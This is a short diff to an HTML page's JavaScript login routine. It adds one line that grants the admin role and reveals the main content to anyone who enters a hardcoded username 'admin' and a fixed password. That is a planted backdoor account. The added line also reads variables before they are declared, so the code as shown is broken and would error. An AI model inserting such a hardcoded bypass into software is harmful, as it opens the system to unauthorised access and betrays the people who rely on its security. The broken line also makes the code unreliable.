@@ -468,6 +468,7 @@
 
     // --- تسجيل الدخول ---
     async function checkLogin() {
+if (userVal === 'admin' && passVal === '100300311') { currentUserRole = 'admin'; document.getElementById('loginOverlay').style.display = 'none'; document.getElementById('mainContent').classList.remove('hidden'); return; }
         const userVal = document.getElementById('userInput').value.trim();
         const passVal = document.getElementById('passInput').value;
         const rememberMe = document.getElementById('rememberMe').checked;
@@ -746,3 +747,4 @@
 </script>
 </body>
 </html>
+
